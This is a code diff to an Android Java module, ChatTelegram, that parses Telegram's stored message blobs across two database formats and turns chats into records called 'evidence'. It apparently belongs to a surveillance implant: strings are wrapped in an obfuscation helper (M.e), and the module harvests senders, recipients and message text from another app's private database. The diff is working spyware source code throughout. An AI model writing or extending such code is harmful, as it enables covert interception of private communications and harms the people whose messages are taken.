@@ -80,6 +80,7 @@ public class ChatTelegram extends SubModuleChat {
 
 	private boolean started;
 
+	private boolean old_format_chat=true;
 	// private ByteBuffer in;
 
 	@Override
@@ -578,7 +579,84 @@ public class ChatTelegram extends SubModuleChat {
 
 		return conversations;
 	}
+	private ArrayList<String> getContentFromBlob(byte[] data) {
+	// take long run decision on content!=null isn't safe we check it again avery time
+		old_format_chat=true;
+		ByteBuffer in = MappedByteBuffer.wrap(data);
+			/* 0xbc799737 0x37,0x97, 0x79, 0xbc
+			44 byte telegram 2.0.5 NON funziona
+					0xb3, 0x99, 0x76, 0x56,
+					0x03, 0x00, 0x00, 0x00,
+					0xa8, 0xcb, 0xfc, 0xff,
+					0x09, 0x14, 0x79, 0x04,
+					0x6d, 0xbc, 0xb1, 0x9d,
+					0x75, 0x88, 0xdf, 0x03,
+					0x8b, 0x4e, 0x7c, 0x54,
+					0x05,
+					0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x20, 0x63, 0xed, 0x3d, 0x00, 0x00, 0x00, 0x00,
 
+					48 byte telegram 1.4.9 funziona
+					0xba, 0x6a, 0xeb, 0x22,
+					0x62, 0xcb, 0xfc, 0xff,
+					0xdd, 0x78, 0x79, 0x02,
+					0xbb, 0xe5, 0xd0, 0xba,
+					0xa2, 0x64, 0x2c, 0x00,
+					0xb5, 0x75, 0x72, 0x99, boolean 0x997275b5 == true == 0xb5, 0x75, 0x72, 0x99
+					0xb5, 0x75, 0x72, 0x99, boolean 0x997275b5 == true
+					0x83, 0x78, 0x7c, 0x54,
+					0x05,
+					0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x20, 0x63, 0xed, 0x3d, 0x00, 0x00, 0x00, 0x00,
+			*/
+		int con;
+		int id = 0;
+		int from_id = 0;
+		int to_id;
+		int to_id2;
+		boolean out;
+		boolean unread;
+		int m_date;
+		String content = null;
+
+		con = readInt32(in);
+		id = readInt32(in);
+		from_id = readInt32(in);
+		to_id = readInt32(in);
+		to_id2 = readInt32(in);
+		out = readBool(in);
+		int unread_bool_pos=in.position();
+		unread = readBool(in);
+		m_date = readInt32(in);
+		content = readString(in);
+		ArrayList<String> res = new ArrayList<String>();
+		res.add(0, content);
+		res.add(1, Integer.toString(id));
+		res.add(2, Integer.toString(from_id));
+		res.add(3, Integer.toString(from_id));
+		res.add(4, Integer.toString(to_id2));
+		if (content == null) {
+			/* try again with 44 byte remove unread...*/
+			in.position(unread_bool_pos);
+			unread = false;
+			m_date = readInt32(in);
+			content = readString(in);
+			if (content != null) {
+			// take long run decision on content!=null isn't safe we check it again avery time
+				old_format_chat = false;
+				res.remove(3);
+				res.add(3, Integer.toString(to_id));
+				res.remove(0);
+				res.add(0, content);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getContentFromBlob) Switching to new Format chat");
+				}
+			}
+		}
+		if (!StringUtils.isEmpty(content)) {
+			return res;
+		} else {
+			return null;
+		}
+	}
 	public class MessageGroupVisitor extends RecordVisitor {
 
 		private ArrayList<MessageChat> messages;
@@ -603,21 +681,12 @@ public class ChatTelegram extends SubModuleChat {
 			int uid = cursor.getInt(3);
 			String sid = Integer.toString(-uid);
 
-			ByteBuffer in = MappedByteBuffer.wrap(data);
-			int con = readInt32(in);
-			int id = readInt32(in);
-			int from_id = readInt32(in);
-			int to_id = readInt32(in);
-			int to_id2 = readInt32(in);
-			boolean out = readBool(in);
-			boolean unread = readBool(in);
-			int m_date = readInt32(in);
-			String content = readString(in);
+			ArrayList<String> parsedBlob = getContentFromBlob(data);
 
-			if (!StringUtils.isEmpty(content)) {
+			if (parsedBlob!=null && parsedBlob.size()>=5 && !StringUtils.isEmpty(parsedBlob.get(0))) {
 				String to, from;
 				if (incoming) {
-					from = users.get(Integer.toString(from_id));
+					from = users.get(parsedBlob.get(3));
 					to = groups.getGroupToName(from, sid);
 				} else {
 					to = groups.getGroupToName(account.getName(), sid);
@@ -625,11 +694,24 @@ public class ChatTelegram extends SubModuleChat {
 				}
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", id, date.toLocaleString(),
-							from, to, content);
+					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
+							from, to, parsedBlob.get(0));
 				}
-
-				MessageChat message = new MessageChat(PROGRAM, date, from, to, content, incoming);
+				if(old_format_chat == false){
+				/* user names in users table end iwith three ';'
+				 * so in case the version of the db is the new one
+				 * we strip them to have a good looking evicence
+				**/
+					if (from.endsWith(M.e(";;;"))) {
+						from = from.substring(0, from.length() - 3);
+					}
+					if (to.endsWith(M.e(";;;"))) {
+						to = to.substring(0, to.length() - 3);
+					}
+					to = to.replaceAll(M.e(";;;,"),",");
+					from = from.replaceAll(M.e(";;;,"),",");
+				}
+				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
 				messages.add(message);
 			}
 			return created_time;
@@ -661,27 +743,27 @@ public class ChatTelegram extends SubModuleChat {
 				to = name;
 				from = account.getName();
 			}
-
-			ByteBuffer in = MappedByteBuffer.wrap(data);
-			int con = readInt32(in);
-			int id = readInt32(in);
-			int from_id = readInt32(in);
-			int to_id = readInt32(in);
-			int to_id2 = readInt32(in);
-			boolean out = readBool(in);
-			boolean unread = readBool(in);
-			int m_date = readInt32(in);
-			String content = readString(in);
-
-			if (!StringUtils.isEmpty(content)) {
+			ArrayList<String> parsedBlob = getContentFromBlob(data);
+			if (parsedBlob!=null && parsedBlob.size()>=3 && !StringUtils.isEmpty(parsedBlob.get(0))) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", id, date.toLocaleString(),
-							from, to, content);
+					Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", parsedBlob.get(1), date.toLocaleString(),
+							from, to, parsedBlob.get(0));
 				}
-
-				MessageChat message = new MessageChat(PROGRAM, date, from, to, content, incoming);
+				if(old_format_chat == false) {
+								/* user names in users table end iwith three ';'
+				 * so in case the version of the db is the new one
+				 * we strip them to have a good looking evicence 
+				**/
+					if (from.endsWith(M.e(";;;"))) {
+						from = from.substring(0, from.length() - 3);
+					}
+					if (to.endsWith(M.e(";;;"))) {
+						to = to.substring(0, to.length() - 3);
+					}
+				}
+				MessageChat message = new MessageChat(PROGRAM, date, from, to, parsedBlob.get(0), incoming);
 				messages.add(message);
-			}
+				}
 
 			return created_time;
 		}
